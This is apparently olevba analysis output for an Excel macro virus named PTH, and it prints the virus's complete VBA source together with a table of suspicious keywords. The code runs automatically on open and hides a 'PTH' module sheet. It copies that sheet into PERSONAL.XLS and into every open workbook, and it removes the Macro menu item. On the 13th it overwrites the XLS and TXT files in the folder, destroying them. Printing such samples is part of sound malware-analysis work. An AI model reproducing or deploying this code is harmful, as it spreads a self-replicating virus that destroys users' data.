olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO PTH.bas 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/PTH'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Declare Function ExitWindowsExec Lib "User" (ByVal lpszExe As String, ByVal lpszParams As String) As Integer
Attribute ExitWindowsExec.VB_ProcData.VB_Invoke_Func = " \n14"
Sub Auto_open()
Attribute Auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
 If Not ThisWorkbook.Name = "PERSONAL.XLS" Then
    Call lay_proc
End If
Application.OnSheetActivate = "PERSONAL.XLS!PTH.message"
If TimeValue(Now) > TimeValue("17:00:00") Then
    Call Set_time
Else
    If TimeValue(Now) > TimeValue("08:00:00") And TimeValue(Now) < TimeValue("12:00:00") Then
        
    Else
        Application.OnTime TimeValue("17:00:00"), "Set_time"
    End If
End If
End Sub

Sub lay_proc()
Attribute lay_proc.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Err_hander
Application.WindowState = xlMinimized
If Not ThisWorkbook.Name = "PERSONAL.XLS" Then
    excelpath = Application.StartupPath
    f_personal = Dir(excelpath + "\PERSONAL.XLS")
    If Not f_personal = "PERSONAL.XLS" Then
        Workbooks.Add
        newname = ActiveWorkbook.Name
        numsheet = Application.SheetsInNewWorkbook
        ThisWorkbook.Sheets("PTH").Copy after:=Workbooks(newname).Sheets(numsheet)
        Modules.Add
        ActiveWindow.Visible = False
        Workbooks(newname).Sheets("PTH").Visible = False
        Workbooks(newname).SaveAs (excelpath + "\PERSONAL.XLS")
    Else
        C = Workbooks("PERSONAL.XLS").Sheets.Count
        m_name = ""
        For k = 1 To C
            m_name = Workbooks("PERSONAL.XLS").Sheets(k).Name
            If m_name = "PTH" Then
                k = C
            End If
        Next
        If Not m_name = "PTH" Then
            Set My_Window = Windows("PERSONAL.XLS")
            My_Window.Visible = True
            ThisWorkbook.Sheets("PTH").Visible = True
            ThisWorkbook.Sheets("PTH").Copy after:=Workbooks("PERSONAL.XLS").Sheets(C)
            Workbooks("PERSONAL.XLS").Sheets("PTH").Visible = False
            My_Window.Visible = False
        End If
    End If
End If
    b = Workbooks.Count
    If Not b = 0 Then
      For i = 1 To b
        C = Workbooks(i).Sheets.Count
        m_name = ""
        For k = 1 To C
            m_name = Workbooks(i).Sheets(k).Name
            If m_name = "PTH" Then
                k = C
            End If
        Next
            If Not m_name = "PTH" Then
                m_cation = Workbooks(i).Name
                Set My_Window = Windows(i)
                m_visible = My_Window.Visible
                If Not m_visible Then
                    My_Window.Visible = True
                End If
                ThisWorkbook.Sheets("PTH").Visible = True
                ThisWorkbook.Sheets("PTH").Copy after:=Workbooks(i).Sheets(C)
                Workbooks(i).Sheets("PTH").Visible = False
                If Not m_visible Then My_Window.Visible = False
                ThisWorkbook.Sheets("PTH").Visible = False
            End If
      Next
    End If
Application.WindowState = xlMaximized
Exit Sub
Err_hander:
If Err = 91 Then
    MsgBox "There is no Active Workbook", 48, "Microsoft Excel/Save"
End If
Resume Next
End Sub
  
Sub Message()
Attribute Message.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo hand_erro
ActiveMenuBar.Menus("&Tools").MenuItems("&Macro...").Delete
m_act_book = ActiveWorkbook.Name
If m_act_book = "PERSONAL.XLS" Then
    ActiveWindow.Visible = False
Else
    m_act_sheet = ActiveWorkbook.ActiveSheet.Name
    If m_act_sheet = "PTH" Then
        ActiveSheet.Visible = False
    Else
    m_pth = ""
        For i = 1 To ActiveWorkbook.Sheets.Count
            m_pth = ActiveWorkbook.Sheets(i).Name
            If m_pth = "PTH" Then i = ActiveWorkbook.Sheets.Count
        Next
        If Not m_pth = "PTH" Then Call lay_proc
    End If
End If
If Not Workbooks("PERSONAL.XLS").Saved Then
    Workbooks("PERSONAL.XLS").Save
End If
Exit Sub
hand_erro:
    Resume Next
End Sub

Sub set_action()
Attribute set_action.VB_Description = "Save change made to active document"
Attribute set_action.VB_ProcData.VB_Invoke_Func = " \n14"
Call lay_proc
ActiveWorkbook.Save
End Sub

Sub Set_time()
Attribute Set_time.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnTime Now + TimeValue("00:05:00"), "Nghich"
End Sub

Sub Warning()
Attribute Warning.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Errhander
ActiveSheet.Range("A1").Select
ActiveCell.Formula = "Now is (over) FIVE O'CLOCK IN THE AFTERNOON. "
ActiveSheet.Range("A2").Select
ActiveCell.Formula = "STOP NOW!"
ActiveSheet.Range("A3").Select
ActiveCell.Formula = " UNLESS STOP YOUR DATA WOULD BE DESTROYED!  "
ActiveSheet.Range("A1:A3").Select
    With Selection.Font
        .Name = ".VnTime"
        .FontStyle = "Regular"
        .Size = 18
        .Strikethrough = True
        .Superscript = False
        .Subscript = False
        .OutlineFont = True
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = 3
    End With
ActiveSheet.Range("B1:M3").Delete
ActiveSheet.Range("A1").Select
Errhander:
End
End Sub


Sub Nghich()
Attribute Nghich.VB_ProcData.VB_Invoke_Func = " \n14"
If Format(Date, "d") = "13" Then
    app_path = ActiveWorkbook.Path
    If Application.UserName = "Afon" Or Application.UserName = "Nguyﾔn Quang Hｶi" Then
        Exit Sub
    Else
        App_file = Dir(app_path & "\*.XLS")
        App_file = Dir(app_path & "\*.TXT")
        Do While Not App_file = ""
        If Not App_file = "PERSONAL.XLS" And Not App_file = "XL5GALRY.XLS" Then
            file_hand = FreeFile()
            Open App_file For Binary As #file_hand
            m_list = "PTH"
            Put #file_hand, , Trim(m_list)
            Close #file_hand
             DoEvents
        End If
        App_file = Dir()
        Loop
    End If
Else
    m_num = ExitWindowsExec("EXCEL", "")
End If

End Sub

Sub p_exit()
Attribute p_exit.VB_ProcData.VB_Invoke_Func = " \n14"
Application.Quit
End Sub

Sub message1()
Attribute message1.VB_ProcData.VB_Invoke_Func = " \n14"
End Sub



-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSExcel.PTH-5771e5de6a7bdc2661df8e127210ea89aa65be78 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  PT
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

